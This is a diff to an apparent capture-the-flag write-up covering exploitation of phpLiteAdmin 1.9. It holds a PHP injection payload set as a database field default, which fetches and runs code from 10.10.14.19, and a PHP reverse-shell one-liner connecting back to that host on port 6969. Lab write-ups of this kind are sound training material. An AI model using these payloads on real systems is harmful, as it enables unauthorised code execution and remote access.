@@ -134,6 +134,9 @@ Should have probably tried some manually first, since that is one everyone tries
 
 ```
 
+
+<h3>Exploiting phpadminlite 1.9</h3>
+
 -------------------------------------------------- ----------------------------------------
  Exploit Title                                    |  Path
                                                   | (/usr/share/exploitdb/)
@@ -148,14 +151,20 @@ Shellcodes: No Result
 Checking out these files we find a method to use.
 
 
-create boo.php database
+
+<h4>Create a database</h4>
+
+create `boo.php` database
+
 create table : newtable  1 field
-create field : somefiled  TEXT 
-default value: <?php system("wget http://10.10.14.19/evil.txt -O /tmp/evil.php;php /tmp/evil.php"); ?>
+
+create field : `somefiled`  `TEXT` 
+
+default value: `<?php system("wget http://10.10.14.19/evil.txt -O /tmp/evil.php;php /tmp/evil.php"); ?>`
 
 
 
-make evil.txt file containing....
+make evil.txt file containing a php reverse-shell one-liner.
 
 `<?php $sock=fsockopen("10.10.14.19",6969);exec("/bin/sh -i <&3 >&3 2>&3");?>`
 
